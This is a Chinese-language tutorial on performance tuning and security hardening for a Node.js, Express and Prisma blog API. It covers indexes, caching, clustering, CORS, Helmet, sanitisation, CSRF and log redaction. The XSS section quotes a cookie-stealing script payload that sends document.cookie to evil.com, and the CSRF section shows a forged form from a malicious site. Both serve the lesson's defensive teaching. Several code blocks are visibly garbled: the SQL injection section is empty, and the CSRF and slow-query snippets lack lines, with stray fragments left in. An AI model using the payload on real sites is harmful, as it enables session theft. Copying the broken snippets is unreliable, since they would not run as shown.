# 第四阶段 · 第5课：性能优化与安全加固

## 场景引入

你的博客 API 功能已经完整，但上线后暴露了两个致命问题。第一是性能：文章列表接口在 100 个并发请求下响应时间从 50ms 飙升到 2 秒，数据库 CPU 占用 100%。你发现原因是没有加索引、存在 N+1 查询、没有缓存。第二是安全：安全团队扫描后报告了 5 个漏洞——CORS 配置允许任意来源访问、缺少 CSRF 防护、用户输入未消毒导致 XSS 风险、日志中泄露了用户密码、依赖库有已知漏洞。功能上线只是第一步，让系统在高并发下稳定运行、在恶意攻击下安全防御，才是生产级别的标准。本课将从数据库索引、响应压缩、集群模式、安全头配置、输入消毒等维度，对博客 API 进行全面加固。

## 学习目标

完成本课学习后，你将能够：

1. 掌握数据库优化、响应压缩、集群模式等性能优化手段
2. 理解 CORS、Helmet、XSS 防护、CSRF 防护等安全机制
3. 使用 autocannon 进行压力测试
4. 对博客 API 进行全面的性能和安全加固

## 一、性能优化

### 1.1 数据库优化

#### 索引（Index）

```
没有索引的查询：全表扫描

┌─────────────────────────────────────┐
│          users 表（100万行）          │
│                                     │
│  SELECT * FROM users WHERE email =  │
│  'zhangsan@example.com'             │
│                                     │
│  数据库必须逐行检查每一行！           │
│  100万行 → 扫描 100万次              │
│  耗时：~500ms                       │
└─────────────────────────────────────┘

有索引的查询：索引查找

┌─────────────────────────────────────┐
│          email 索引（B+树）           │
│                                     │
│           [a-m] [n-z]               │
│          /         \                │
│     [a-f] [g-m]  [n-s] [t-z]       │
│     ...    ...    ...   ...         │
│                 ↓                    │
│           zhangsan@...              │
│                 ↓                    │
│           → 第 52341 行              │
│                                     │
│  直接定位到目标行！                   │
│  耗时：~1ms                         │
└─────────────────────────────────────┘
```

```typescript
// prisma/schema.prisma

// 为经常查询的字段添加索引
model User {
  id        Int      @id @default(autoincrement())
  email     String   @unique          // 唯一索引（登录查询）
  name      String
  avatar    String?
  bio       String?
  password  String
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  posts    Post[]
  comments Comment[]
  likes    Like[]

  @@index([name])                      // 普通索引（按名字搜索）
  @@index([createdAt])                 // 普通索引（按时间排序）
}

model Post {
  id        Int      @id @default(autoincrement())
  title     String
  content   String
  summary   String?
  status    PostStatus @default(PUBLISHED)
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  authorId Int
  author   User   @relation(fields: [authorId], references: [id])

  comments Comment[]
  likes    Like[]
  tags     Tag[]

  @@index([authorId])                  // 按作者查询
  @@index([status])                    // 按状态筛选
  @@index([createdAt])                 // 按时间排序
  @@index([status, createdAt])         // 复合索引（最常用！）
}

model Comment {
  id        Int      @id @default(autoincrement())
  content   String
  createdAt DateTime @default(now())

  postId   Int
  post     Post   @relation(fields: [postId], references: [id])
  userId   Int
  user     User   @relation(fields: [userId], references: [id])

  parentId Int?
  parent   Comment?  @relation("CommentReplies", fields: [parentId], references: [id])
  replies  Comment[] @relation("CommentReplies")

  @@index([postId])                    // 按文章查评论
  @@index([userId])                    // 按用户查评论
  @@index([parentId])                  // 按父评论查回复
}
```

**索引使用原则：**

```
✅ 适合加索引的字段：           ❌ 不适合加索引的字段：

· WHERE 条件中的字段            · 很少在查询中使用的字段
· JOIN 关联的字段               · 值的种类很少（如性别：男/女）
· ORDER BY 排序的字段           · 数据量很小的表
· GROUP BY 分组的字段           · 频繁更新的字段（索引也需要维护）

⚠️ 注意：索引不是越多越好！
每个索引都会占用存储空间
每次写入（INSERT/UPDATE/DELETE）都要更新索引
通常 5-8 个索引是比较合理的范围
```

```typescript
// ❌ 错误示例：N+1 查询问题
// 获取 10 篇文章，每篇都要查一次作者 → 1 + 10 = 11 次查询！
const posts = await prisma.post.findMany({ take: 10 });
for (const post of posts) {
  const author = await prisma.user.findUnique({ where: { id: post.authorId } });
  // ... 每次循环都查一次数据库
}

// ✅ 正确示例：使用 include 一次性查询（JOIN）
const posts = await prisma.post.findMany({
  take: 10,
  include: {
    author: { select: { id: true, name: true, avatar: true } },
  },
});
// 只有 1 次查询（SQL 自动 JOIN）
```

```typescript
// ❌ 错误示例：在循环中执行查询
for (const userId of userIds) {
  const user = await prisma.user.findUnique({ where: { id: userId } });
  // 100 个用户 = 100 次查询
}

// ✅ 正确示例：批量查询
const users = await prisma.user.findMany({
  where: { id: { in: userIds } },
});
// 1 次查询，返回所有用户
```

### 1.2 响应压缩

```typescript
// src/middleware/compression.ts
import compression from 'compression';
import { Request, Response } from 'express';

/**
 * 响应压缩中间件
 *
 * 原理：服务器将响应体压缩后发送，浏览器自动解压
 * 效果：通常可以减少 60-80% 的传输大小
 */
export const compressionMiddleware = compression({
  // 压缩级别（1-9，数字越大压缩率越高但越慢）
  level: 6,

  // 只有超过这个大小的响应才压缩（单位：字节）
  threshold: 1024,  // 1KB

  // 根据请求头决定是否压缩
  filter: (req: Request, res: Response) => {
    // 如果客户端不支持压缩，跳过
    if (req.headers['x-no-compression']) {
      return false;
    }
    // 使用默认过滤器
    return compression.filter(req, res);
  },
});

// 在 app.ts 中使用：
// app.use(compressionMiddleware);
```

### 1.3 分页优化

```typescript
// 偏移分页 vs 游标分页

// ❌ 偏移分页（OFFSET）—— 页数大了会慢
// SELECT * FROM posts ORDER BY id DESC LIMIT 10 OFFSET 10000
// 数据库需要扫描前 10000 条，然后丢弃，返回第 10001-10010 条
// 页数越大，OFFSET 越大，查询越慢

// ✅ 游标分页（Cursor）—— 始终快
// SELECT * FROM posts WHERE id < 10000 ORDER BY id DESC LIMIT 10
// 数据库直接从 id=10000 开始找，不需要扫描前面的数据
```

```typescript
// src/services/post.service.ts

/**
 * 游标分页实现
 *
 * 使用上一页最后一条记录的 ID 作为游标
 * 性能：无论页数多大，查询时间恒定
 */
export async function getPostsWithCursor(params: {
  cursor?: number;    // 上一页最后一条的 ID
  limit?: number;     // 每页数量
  tag?: string;
}) {
  const { cursor, limit = 10, tag } = params;

  const where: any = {
    status: 'PUBLISHED',
    ...(tag ? { tags: { some: { name: tag } } } : {}),
  };

  // 如果有游标，添加 ID 过滤条件
  if (cursor) {
    where.id = { lt: cursor };  // id < cursor
  }

  const posts = await prisma.post.findMany({
    where,
    take: limit + 1,  // 多取一条，判断是否有下一页
    orderBy: { id: 'desc' },
    select: {
      id: true,
      title: true,
      summary: true,
      createdAt: true,
      author: { select: { id: true, name: true, avatar: true } },
      _count: { select: { comments: true, likes: true } },
    },
  });

  const hasMore = posts.length > limit;
  const data = hasMore ? posts.slice(0, limit) : posts;
  const nextCursor = hasMore ? data[data.length - 1].id : null;

  return {
    data,
    pagination: {
      hasMore,
      nextCursor,
      limit,
    },
  };
}
```

### 1.4 集群模式

```
Node.js 单线程的限制：

┌─────────────────────────────────────┐
│         Node.js 进程                 │
│                                     │
│  主线程（单个）                       │
│  ┌───────────────────────────────┐  │
│  │ Event Loop                    │  │
│  │ ┌───┐ ┌───┐ ┌───┐ ┌───┐     │  │
│  │ │ 1 │ │ 2 │ │ 3 │ │ 4 │ ... │  │
│  │ └───┘ └───┘ └───┘ └───┘     │  │
│  └───────────────────────────────┘  │
│                                     │
│  只用到 1 个 CPU 核心！               │
│  如果服务器有 8 核心 → 浪费 7 个      │
└─────────────────────────────────────┘

集群模式：

┌─────────────────────────────────────────────┐
│                主进程（Master）               │
│                负载均衡                       │
│           ┌─────┼─────┐                     │
│           ▼     ▼     ▼                     │
│  ┌────────┐ ┌────────┐ ┌────────┐           │
│  │ Worker │ │ Worker │ │ Worker │ × CPU核心数 │
│  │ (进程1) │ │ (进程2) │ │ (进程3) │           │
│  └────────┘ └────────┘ └────────┘           │
│                                             │
│  每个 Worker 独立处理请求                     │
│  充分利用所有 CPU 核心                        │
└─────────────────────────────────────────────┘
```

#### 使用 Node.js Cluster

```typescript
// src/cluster.ts
import cluster from 'cluster';
import os from 'os';
import { app } from './app';

const numCPUs = os.cpus().length;

if (cluster.isPrimary) {
  console.log(`🎯 主进程 PID: ${process.pid}`);
  console.log(`🔧 启动 ${numCPUs} 个 Worker 进程`);

  // 创建 Worker 进程
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // 监听 Worker 退出，自动重启
  cluster.on('exit', (worker, code, signal) => {
    console.log(`⚠️ Worker ${worker.process.pid} 退出 (code: ${code}, signal: ${signal})`);
    console.log('🔄 启动新的 Worker...');
    cluster.fork();
  });

  // 监听 Worker 在线
  cluster.on('online', (worker) => {
    console.log(`✅ Worker ${worker.process.pid} 已上线`);
  });
} else {
  // Worker 进程：启动 HTTP 服务器
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`🚀 Worker ${process.pid} 已启动，监听端口 ${PORT}`);
  });
}
```

```nginx
# /etc/nginx/conf.d/blog-api.conf

upstream blog_api {
    # 负载均衡策略：轮询（默认）
    server 127.0.0.1:3000;
    server 127.0.0.1:3001;
    server 127.0.0.1:3002;

    # 保持长连接（减少 TCP 握手开销）
    keepalive 64;
}

server {
    listen 80;
    server_name api.yourblog.com;

    # 强制跳转 HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name api.yourblog.com;

    # SSL 证书
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # 安全头
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # 请求体大小限制
    client_max_body_size 10m;

    # 代理到 Node.js
    location / {
        proxy_pass http://blog_api;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    # 静态文件缓存
    location /static/ {
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
}
```

### 2.1 CORS 配置

```
CORS（跨域资源共享）问题：

浏览器的安全策略：默认不允许网页请求不同域名的 API

前端（yourblog.com）        后端（api.yourblog.com）
    │                              │
    │── GET /api/posts ───────────►│
    │                              │
    │◄── ❌ CORS 错误 ────────────│
    │   "Access-Control-Allow-     │
    │    Origin" 头缺失            │

解决方案：服务器在响应头中声明允许的来源
```

```typescript
// src/middleware/cors.ts
import cors from 'cors';

/**
 * CORS 配置
 *
 * ⚠️ 关键：不要用 origin: '*'，要精确配置允许的来源
 *
 * 原因：
 * 1. '*' 允许任何网站访问你的 API
 * 2. 恶意网站可以利用用户的登录状态发起请求
 * 3. 带 Cookie 的请求不能用 '*'（浏览器会拒绝）
 */
export const corsMiddleware = cors({
  // 精确配置允许的来源
  origin: (origin, callback) => {
    const allowedOrigins = [
      'http://localhost:3000',           // 本地开发
      'http://localhost:3001',           // 本地测试
      'https://yourblog.com',           // 生产前端
      'https://www.yourblog.com',       // 带 www
    ];

    // 允许没有 origin 的请求（如 Postman、curl）
    if (!origin) {
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('不允许的跨域请求'));
    }
  },

  // 允许携带 Cookie
  credentials: true,

  // 允许的 HTTP 方法
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],

  // 允许的请求头
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'Accept',
  ],

  // 暴露给客户端的响应头
  exposedHeaders: [
    'X-Total-Count',        // 总记录数
    'X-RateLimit-Limit',    // 限流上限
    'X-RateLimit-Remaining',// 剩余请求数
  ],

  // 预检请求缓存时间（秒）
  maxAge: 86400,  // 24 小时
});
```

### 2.2 Helmet 中间件

```typescript
// src/middleware/security.ts
import helmet from 'helmet';
import { Request, Response, NextFunction } from 'express';

/**
 * Helmet 设置安全 HTTP 头
 *
 * 自动设置以下安全相关的 HTTP 响应头：
 * - Content-Security-Policy: 防止 XSS
 * - X-Content-Type-Options: 防止 MIME 嗅探
 * - X-Frame-Options: 防止点击劫持
 * - Strict-Transport-Security: 强制 HTTPS
 * - X-XSS-Protection: XSS 过滤
 * - ...
 */
export const securityMiddleware = helmet({
  // 内容安全策略
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],                    // 默认只允许同源
      scriptSrc: ["'self'"],                      // 只允许同源脚本
      styleSrc: ["'self'", "'unsafe-inline'"],    // 允许内联样式
      imgSrc: ["'self'", 'data:', 'https:'],      // 允许 data: 和 https: 图片
      connectSrc: ["'self'"],                      // API 请求只允许同源
    },
  },

  // 严格传输安全（HTTPS）
  hsts: {
    maxAge: 31536000,     // 1 年
    includeSubDomains: true,
    preload: true,
  },

  // 防止点击劫持
  frameguard: {
    action: 'deny',
  },

  // 防止 MIME 嗅探
  noSniff: true,

  // XSS 过滤
  xssFilter: true,

  // 隐藏 X-Powered-By 头
  hidePoweredBy: true,
});

/**
 * 额外的安全头（Helmet 没有覆盖的）
 */
export const additionalSecurityHeaders = (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  // 不缓存敏感接口的响应
  res.set({
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0',
    'Surrogate-Control': 'no-store',
  });

  next();
};
```

### 2.3 输入消毒（防 XSS）

```
XSS（跨站脚本攻击）示例：

攻击者在评论中输入：
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

如果服务器不消毒，直接存入数据库
其他用户浏览时，这段脚本会在他们的浏览器中执行
→ 用户的 Cookie 被盗！

防御：在存储之前，将特殊字符转义
<script>  →  &lt;script&gt;
```

```typescript
// src/middleware/sanitize.ts
import { Request, Response, NextFunction } from 'express';
import sanitizeHtml from 'sanitize-html';

/**
 * 输入消毒中间件
 *
 * 递归遍历请求体中的所有字符串值
 * 移除危险的 HTML 标签和属性
 */
export function sanitizeMiddleware(
  req: Request,
  res: Response,
  next: NextFunction
) {
  if (req.body && typeof req.body === 'object') {
    req.body = sanitizeObject(req.body);
  }

  next();
}

/**
 * 递归消毒对象
 */
function sanitizeObject(obj: any): any {
  if (typeof obj === 'string') {
    return sanitizeHtml(obj, {
      allowedTags: [],        // 不允许任何 HTML 标签
      allowedAttributes: {},  // 不允许任何属性
      disallowedTagsMode: 'discard', // 直接丢弃不允许的标签
    });
  }

  if (Array.isArray(obj)) {
    return obj.map(sanitizeObject);
  }

  if (obj && typeof obj === 'object') {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(obj)) {
      sanitized[key] = sanitizeObject(value);
    }
    return sanitized;
  }

  return obj;
}

/**
 * 允许部分 HTML 的消毒（用于富文本内容）
 */
export function sanitizeRichText(html: string): string {
  return sanitizeHtml(html, {
    allowedTags: [
      'p', 'br', 'strong', 'em', 'u', 's',
      'h1', 'h2', 'h3', 'h4',
      'ul', 'ol', 'li',
      'blockquote', 'code', 'pre',
      'a', 'img',
    ],
    allowedAttributes: {
      'a': ['href', 'title', 'target'],
      'img': ['src', 'alt', 'width', 'height'],
      'code': ['class'],
      'pre': ['class'],
    },
    // 防止 javascript: 协议
    allowedSchemes: ['http', 'https', 'mailto'],
  });
}
```

### 2.4 SQL 注入防护

```
SQL 注入示例：

❌ 拼接 SQL（危险！）：
```

### 2.5 CSRF 防护

```
CSRF（跨站请求伪造）攻击过程：

1. 用户登录了 yourblog.com（浏览器保存了 Cookie）
2. 用户访问了恶意网站 evil.com
3. evil.com 的页面中有一个隐藏的表单：
   <form action="https://yourblog.com/api/posts" method="POST">
     <input name="title" value="我是骗子">
     <input name="content" value="哈哈你被骗了">
   </form>
4. 浏览器自动附带 Cookie 提交表单
5. 服务器认为是合法用户，创建了文章

防御：CSRF Token
- 服务器生成一个随机 Token，嵌入表单
- 提交时验证 Token
- 恶意网站无法获取这个 Token
```

```typescript

 * CSRF 防护中间件

 * 1. CSRF Token（传统方案）
 * 2. SameSite Cookie（现代方案，更简单）
 * 3. 自定义请求头检查（前后端分离常用）
 */

// 方案 1：CSRF Token
export const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  },
});

// 方案 2：检查自定义请求头（前后端分离推荐）
export function csrfHeaderCheck(
  req: Request,
  res: Response,
  next: NextFunction
) {
  // GET/HEAD/OPTIONS 请求是安全的，不需要检查
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  // 检查自定义请求头
  // 浏览器的跨域请求默认不会携带自定义头
  // 所以恶意网站无法伪造带这个头的请求
  const customHeader = req.headers['x-requested-with'];
  if (!customHeader || customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({
      error: '缺少 CSRF 防护头',
    });
  }

  next();
}
```

```typescript
/**
 * 日志脱敏工具
 *
 * 在记录日志时，自动隐藏敏感信息
 */

const SENSITIVE_FIELDS = [
  'password',
  'passwordHash',
  'token',
  'accessToken',
  'refreshToken',
  'secret',
  'apiKey',
  'creditCard',
  'ssn',
  'authorization',
];

/**
 * 脱敏对象中的敏感字段
 */
export function sanitizeForLog(obj: any, depth = 0): any {
  if (depth > 10) return '[深度超过限制]'; // 防止循环引用

  if (typeof obj === 'string') {
    // 如果是长字符串（可能是 Token），截断
    if (obj.length > 100) {
      return obj.substring(0, 20) + '...[已截断]';
    }
    return obj;
  }

  if (Array.isArray(obj)) {
    return obj.map(item => sanitizeForLog(item, depth + 1));
  }

  if (obj && typeof obj === 'object') {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(obj)) {
      const lowerKey = key.toLowerCase();
      if (SENSITIVE_FIELDS.some(field => lowerKey.includes(field))) {
        sanitized[key] = '***REDACTED***';
      } else {
        sanitized[key] = sanitizeForLog(value, depth + 1);
      }
    }
    return sanitized;
  }

  return obj;
}

      ? undefined  // 生产环境不暴露堆栈
```

### 3.2 全局错误处理

```typescript
// src/middleware/error-handler.ts
import { Request, Response, NextFunction } from 'express';

/**
 * 全局错误处理中间件
 *
 * 关键原则：
 * 1. 生产环境不暴露内部错误细节
 * 2. 记录完整错误日志（但脱敏）
 * 3. 返回统一格式的错误响应
 */
export function globalErrorHandler(
  err: any,
  req: Request,
  res: Response,
  next: NextFunction
) {
  // 记录完整错误（开发环境打印到控制台，生产环境写入日志文件）
  console.error('❌ 错误:', {
    message: err.message,
    code: err.code,
    statusCode: err.statusCode,
    path: req.path,
    method: req.method,
    ip: req.ip,
    userId: (req as any).user?.userId,
    stack: process.env.NODE_ENV !== 'production' ? err.stack : undefined,
  });

  // 确定状态码
  const statusCode = err.statusCode || err.status || 500;

  // 构造响应
  const response: any = {
    error: true,
    message: getSafeErrorMessage(err, statusCode),
    code: err.code || 'INTERNAL_ERROR',
  };

  // 开发环境添加额外信息
  if (process.env.NODE_ENV !== 'production') {
    response.stack = err.stack;
    response.details = err.details;
  }

  res.status(statusCode).json(response);
}

/**
 * 获取安全的错误消息（不暴露内部细节）
 */
function getSafeErrorMessage(err: any, statusCode: number): string {
  // 已知的业务错误，可以返回消息
  if (err.isOperational) {
    return err.message;
  }

  // Prisma 错误
  if (err.code?.startsWith('P')) {
    switch (err.code) {
      case 'P2002':
        return '数据已存在，请勿重复提交';
      case 'P2025':
        return '请求的资源不存在';
      case 'P2003':
        return '关联数据不存在';
      default:
        return '数据库操作失败';
    }
  }

  // 根据状态码返回通用消息
  const safeMessages: Record<number, string> = {
    400: '请求参数错误',
    401: '未授权，请先登录',
    403: '没有权限执行此操作',
    404: '请求的资源不存在',
    409: '数据冲突',
    422: '请求数据格式错误',
    429: '请求过于频繁，请稍后再试',
    500: '服务器内部错误，请稍后再试',
  };

  return safeMessages[statusCode] || '服务器内部错误';
}
```

```typescript
export function setupSlowQueryLog(prisma: PrismaClient, thresholdMs: number = 100) {
  prisma.$use(async (params, next) => {
    const startTime = Date.now();
    const result = await next(params);

        model: params.model,
        action: params.action,
        args: JSON.stringify(params.args).substring(0, 200),
      });
    }

    return result;
  });
}
```

```typescript
  const post = await prisma.post.findUnique({
    where: { id },
    select: {
      id: true,
      title: true,
      summary: true,
    },
  });

```

**要点**：
- 复合索引 `[status, createdAt]` 覆盖最常用的"按状态筛选 + 按时间排序"查询，比两个单独索引效率更高

- Prisma 中间件记录慢查询，帮助定位性能瓶颈

```typescript
// src/middleware/security-setup.ts
import helmet from 'helmet';
import cors from 'cors';
import { Request, Response, NextFunction } from 'express';
import sanitizeHtml from 'sanitize-html';

// ==================== 1. CORS 配置 ====================
export const corsMiddleware = cors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'http://localhost:3000',
      'http://localhost:5173',
      'https://yourblog.com',
      'https://www.yourblog.com',
    ];

    // 允许无 origin 的请求（如 Postman、服务器端请求）
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS 策略不允许此来源'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Total-Count', 'X-RateLimit-Limit', 'X-RateLimit-Remaining'],
  maxAge: 86400,
});

// ==================== 2. Helmet 安全头 ====================
export const securityMiddleware = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  frameguard: { action: 'deny' },
  noSniff: true,
  xssFilter: true,
  hidePoweredBy: true,
});

// ==================== 3. 输入消毒 ====================
export function sanitizeMiddleware(req: Request, res: Response, next: NextFunction) {
  if (req.body && typeof req.body === 'object') {
    req.body = sanitizeObject(req.body);
  }
  next();
}

function sanitizeObject(obj: any): any {
  if (typeof obj === 'string') {
    return sanitizeHtml(obj, {
      allowedTags: [],
      allowedAttributes: {},
      disallowedTagsMode: 'discard',
    });
  }
  if (Array.isArray(obj)) return obj.map(sanitizeObject);
  if (obj && typeof obj === 'object') {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(obj)) {
      sanitized[key] = sanitizeObject(value);
    }
    return sanitized;
  }
  return obj;
}

// ==================== 4. CSRF 防护（自定义请求头方案）====================
export function csrfHeaderCheck(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const customHeader = req.headers['x-requested-with'];
  if (!customHeader || customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({ error: '缺少 CSRF 防护头' });
  }

  next();
}

// ==================== 5. 日志脱敏 ====================
const SENSITIVE_FIELDS = ['password', 'token', 'secret', 'apikey', 'authorization', 'creditcard'];

export function sanitizeForLog(obj: any, depth: number = 0): any {
  if (depth > 10) return '[深度超限]';
  if (typeof obj === 'string') {
    return obj.length > 100 ? obj.substring(0, 20) + '...[已截断]' : obj;
  }
  if (Array.isArray(obj)) return obj.map(item => sanitizeForLog(item, depth + 1));
  if (obj && typeof obj === 'object') {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(obj)) {
      if (SENSITIVE_FIELDS.some(field => key.toLowerCase().includes(field))) {
        sanitized[key] = '***REDACTED***';
      } else {
        sanitized[key] = sanitizeForLog(value, depth + 1);
      }
    }
    return sanitized;
  }
  return obj;
}
```

## 常见误区

1. **不加数据库索引就上线**：100 万行数据的表，`WHERE email = 'xxx'` 没有索引，每次查询全表扫描。登录接口从 1ms 变成 500ms，高并发下直接拖垮数据库。

2. **CORS 配置用 `origin: '*'`**：允许任何网站访问你的 API，恶意网站可以利用用户的登录状态发起请求。生产环境必须精确配置允许的来源域名。

3. **生产环境暴露错误堆栈**：500 错误返回完整的 `err.stack`，直接暴露了项目结构、文件路径、第三方库版本。生产环境只返回安全的错误消息，详细信息写日志。

4. **不做输入消毒就存储用户输入**：用户在评论中注入 `<script>` 标签，其他用户浏览时执行恶意脚本（XSS 攻击）。所有用户输入在存储前必须用 `sanitize-html` 过滤。

---

## 工程建议

1. **复合索引覆盖最常用查询**：`@@index([status, createdAt])` 覆盖"按状态筛选 + 按时间排序"的查询，比两个单独索引效率更高。索引的列顺序要和 `WHERE` + `ORDER BY` 的顺序一致。

2. **用游标分页替代偏移分页**：`WHERE id < cursor LIMIT 10` 比 `OFFSET 10000 LIMIT 10` 快得多。游标分页的性能不随页数增长而下降，适合无限滚动场景。

3. **Helmet + CORS + 限流是生产三件套**：Helmet 设置安全 HTTP 头，CORS 控制跨域访问，限流防止 API 被滥用。这三个中间件应该在所有路由之前加载。

4. **上线前用 `npm audit` 检查依赖漏洞**：第三方库可能有已知的安全漏洞。`npm audit --audit-level=high` 只看高危漏洞，`npm audit fix` 自动修复。定期执行，不要等到出事才检查。
